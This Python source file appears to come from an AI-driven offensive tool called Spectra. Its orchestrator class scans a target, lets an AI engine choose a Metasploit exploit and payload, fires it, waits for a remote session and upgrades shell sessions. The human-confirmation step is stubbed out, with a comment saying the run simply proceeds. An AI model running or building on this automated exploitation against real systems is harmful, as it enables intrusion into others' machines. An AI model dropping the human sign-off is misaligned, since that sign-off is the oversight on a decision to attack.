import time
import logging
import threading
from typing import Optional, Any, Dict

from modules.scanner import ScannerUnit
from modules.exploiter import ExploiterUnit
from modules.post_exploit import PostExploitUnit
from brain.ai_engine import AIEngine

from core.exceptions import (
    SpectraException,
    MSFRPCException,
    ExploitExecutionException,
    NetworkBlockException,
)

logger = logging.getLogger("core.orchestrator")


class SpectraOrchestrator:
    """
    Orchestrates recon -> plan -> exploit -> post-exploit.
    - Accepts an optional shutdown_event (threading.Event) to support graceful termination.
    - Returns a structured dict with keys: status, reason, details.
    """

    def __init__(
        self,
        target: str,
        lhost: str,
        msf_client: Any,
        dry_run: bool = False,
        auto_confirm: bool = False,
        shutdown_event: Optional[threading.Event] = None,
        poll_timeout: int = 60,
    ):
        self.target = target
        self.lhost = lhost
        self.msf = msf_client
        self.scanner = ScannerUnit(target)
        # ExploiterUnit and PostExploitUnit expect underlying msf client object (existing code)
        self.exploiter = ExploiterUnit(msf_client.client)
        self.post = PostExploitUnit(msf_client.client)
        self.brain = AIEngine()
        self.dry_run = dry_run
        self.auto_confirm = auto_confirm
        self.shutdown_event = shutdown_event
        self.poll_timeout = poll_timeout

    def _is_shutdown(self) -> bool:
        return bool(self.shutdown_event and self.shutdown_event.is_set())

    def run(self) -> Dict[str, Any]:
        """
        Run orchestration and return structured result:
          {"status": "success"|"failure"|"partial"|"interrupted"|"unknown",
           "reason": "<short_code>",
           "details": {...}}
        """
        try:
            logger.info("Starting reconnaissance for target: %s", self.target)
            recon = self.scanner.scan_services()
            if self._is_shutdown():
                logger.info("Shutdown requested after recon step")
                return {"status": "interrupted", "reason": "shutdown_requested", "details": {}}

            logger.debug("Recon result: %s", recon)

            logger.info("Requesting strategy from AI engine")
            plan = self.brain.get_strategy(recon)
            # brain returns either a strategy dict or {"manual_review": True, "rationale": "..."}
            if not plan:
                logger.error("AI engine returned no plan")
                return {"status": "failure", "reason": "no_plan", "details": {}}

            if isinstance(plan, dict) and plan.get("manual_review"):
                logger.warning("AI requested manual review: %s", plan.get("rationale"))
                return {
                    "status": "partial",
                    "reason": "manual_review_required",
                    "details": {"rationale": plan.get("rationale")},
                }

            # optional human confirmation if requested and not auto-confirmed
            if not self.auto_confirm and not self.dry_run:
                logger.info("Plan prepared: %s", {k: plan.get(k) for k in ("module", "payload", "vector")})
                # If you want interactive prompt, you can implement it here; for automation we proceed.
                # For safety in automated runs, we keep auto_confirm flag to allow skipping prompt.

            if self._is_shutdown():
                logger.info("Shutdown requested before exploit execution")
                return {"status": "interrupted", "reason": "shutdown_requested", "details": {}}

            # remember pre-existing sessions
            try:
                pre_sessions = set(getattr(self.msf.client.sessions, "list", {}).keys())
            except Exception as e:
                logger.exception("Failed to read MSF sessions")
                raise MSFRPCException("Failed to read MSF sessions", details={"error": str(e)}, original=e)

            # execute exploit (ExploiterUnit should respect dry_run / safe mode internally if implemented)
            logger.info("Executing exploit plan: module=%s payload=%s", plan.get("module"), plan.get("payload"))
            try:
                # maintain backward compatibility with existing ExploiterUnit signature
                try:
                    console = self.exploiter.execute(plan, self.target, dry_run=self.dry_run)
                except TypeError:
                    console = self.exploiter.execute(plan, self.target)
            except Exception as e:
                logger.exception("Exploit execution failed")
                raise ExploitExecutionException("Exploit execution failed", details={"plan": plan}, original=e)

            # poll for new sessions until timeout or shutdown requested
            start = time.time()
            logger.info("Polling for new sessions (timeout=%ds)...", self.poll_timeout)
            while time.time() - start < self.poll_timeout:
                if self._is_shutdown():
                    logger.info("Shutdown requested during polling")
                    return {"status": "interrupted", "reason": "shutdown_requested", "details": {}}

                try:
                    current = set(getattr(self.msf.client.sessions, "list", {}).keys())
                except Exception as e:
                    logger.exception("Failed to read MSF sessions during polling")
                    raise MSFRPCException("MSF session read failed during polling", original=e)

                new = current - pre_sessions
                if new:
                    s_id = list(new)[0]
                    session_info = self.msf.client.sessions.list[s_id]
                    logger.info("New session detected: %s (type=%s)", s_id, session_info.get("type"))
                    # if it's a shell session, attempt upgrade (post_exploit)
                    if session_info.get("type") == "shell":
                        try:
                            self.post.upgrade_shell(s_id, self.lhost)
                        except Exception as e:
                            logger.exception("Failed to upgrade shell session")
                            # return success but note that upgrade failed
                            return {
                                "status": "success",
                                "reason": "session_opened_upgrade_failed",
                                "details": {"session_id": s_id, "upgrade_error": str(e)},
                            }
                        # continue polling for a non-shell session OR treat upgraded as success
                        return {
                            "status": "success",
                            "reason": "session_opened_and_upgraded",
                            "details": {"session_id": s_id, "type": "upgraded_shell"},
                        }
                    # non-shell session: success
                    return {"status": "success", "reason": "session_opened", "details": {"session_id": s_id, "type": session_info.get("type")}}

                # read exploit console logs if available to classify failure
                try:
                    if console:
                        log_data = console.read().get("data", "")
                        if "Exploit completed" in log_data or "exploit completed" in log_data.lower():
                            classification = ""
                            try:
                                classification = self.exploiter.classify_log(log_data)
                            except Exception:
                                classification = "unknown_failure"
                            logger.error("Exploit completed without session: %s", classification)
                            return {"status": "failure", "reason": "exploit_failed", "details": {"classification": classification, "log": log_data}}
                except Exception:
                    # console may be None or read() may fail; ignore and continue until timeout
                    logger.debug("Console read failed or not available", exc_info=True)

                time.sleep(5)

            # timeout expired
            logger.warning("Polling timeout expired without new session")
            return {"status": "failure", "reason": "timeout_no_session", "details": {}}

        except SpectraException as se:
            # structured exception coming from internal modules
            logger.error("SpectraException occurred: %s", se)
            return {"status": "failure", "reason": se.reason.value if hasattr(se, "reason") else "exception", "details": se.to_dict() if hasattr(se, "to_dict") else {"message": str(se)}}
        except Exception as e:
            # unexpected error - wrap and return
            logger.exception("Unhandled exception in orchestrator")
            wrapped = SpectraException(str(e))
            return {"status": "failure", "reason": wrapped.reason.value, "details": {"error": str(e)}}
